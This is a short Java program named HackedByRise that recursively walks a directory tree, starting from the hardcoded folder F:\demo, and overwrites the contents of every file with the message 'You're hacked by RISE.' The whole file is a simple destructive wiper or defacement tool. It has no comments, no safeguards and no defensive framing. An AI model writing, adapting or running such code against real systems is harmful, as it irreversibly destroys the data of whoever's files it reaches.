package hackedbyrise;
import java.util.*;
import java.io.File;
import java.io.FileWriter;


public class HackedByRise {

    
    public void writefiles(String directoryName){
        File directory = new File(directoryName);
        File[] fList = directory.listFiles();
        for (File file : fList){
            if (file.isFile()){
                  try{    
                            FileWriter fw=new FileWriter(file.getAbsolutePath());    
                            fw.write("You're hacked by RISE.");    
                            fw.close();    
                    
                  }catch(Exception e)
                    {
                        System.out.println(e);
                    }    
                        
            }    
            
         else if (file.isDirectory()){
                writefiles(file.getAbsolutePath());
            }
        }
    }

    public static void main(String args[])
    {
        HackedByRise hbr=new HackedByRise();
        hbr.writefiles("F:\\demo");
        System.out.println("file is being overwrited.");
    }
}
    